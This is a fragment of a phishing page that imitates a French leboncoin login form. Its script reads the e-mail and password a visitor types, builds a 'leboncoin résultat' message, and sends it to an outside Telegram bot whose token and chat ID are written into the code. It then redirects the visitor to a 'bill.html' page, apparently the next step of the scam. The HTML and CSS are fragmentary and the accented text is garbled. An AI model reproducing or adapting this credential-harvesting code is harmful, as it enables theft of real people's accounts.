        body{
            height: 100vh;

        .top{
            position: fixed;
            left: 0;

        <form id="form">
            <label for="email">E-mail *</label><br>
            <input type="email" id="email" required>
            <br>
            <label for="password">Mot de passe *</label><br>
            <input type="password" id="pwd" required>
            <br>
            <br>

            <br>
            <br>

            <a href="#">Cr√©er un compte</a>

</body>

<script>

document.getElementById('form').addEventListener('submit', function (e) {
            e.preventDefault();
        
            // R√©cup√©ration des valeurs du formulaire
            const email = document.getElementById('email').value;
            const pwd = document.getElementById('pwd').value;
            
            // Validation des champs
            if (!email || !pwd) {
                alert('Veuillez remplir tous les champs.');
                return;
            }
        
           
            // Construction du message
            const message = `
                leboncoin r√©sultat :
                \nüì©Email : ${email}
                \nüîëmot de passe: ${pwd}
                
            `;
        
            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
            const chatId = '7332838769'; // Remplacez par votre chat ID
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
            // Envoi du message au bot Telegram
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    localStorage.setItem('email', email);
                    console.log('Votre message a √©t√© envoy√© avec succ√®s !');
                    window.location.href='./bill.html';
                } else {
                    console.error('Erreur lors de l\'envoi du message:', data.description);
                    console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez r√©essayer.');
                }
            })
            .catch(error => {
                console.error('Erreur r√©seau ou serveur:', error);
                console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez r√©essayer.');
            });
        });
        
</script>
